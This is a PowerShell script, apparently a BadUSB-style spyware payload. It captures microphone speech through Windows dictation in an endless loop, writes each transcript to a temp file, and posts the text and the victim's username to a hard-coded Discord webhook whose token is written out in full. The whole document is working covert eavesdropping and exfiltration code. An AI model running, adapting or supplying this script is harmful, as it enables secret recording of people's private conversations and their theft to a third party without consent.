function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$text 
    )

    $dc = 'https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3'

    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    $log = "$env:TEMP\VoiceLog.txt"

    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $results | Set-Content -Path $log
            $text = Get-Content $log -Raw
            DC-Upload $text

            switch -regex ($results) {
                '\bnote\b' {Start-Process notepad}
                '\bexit\b' {break}
            }
        }
    }

    if (Test-Path $log) {
        Clear-Content -Path $log
    }
}

voiceLogger
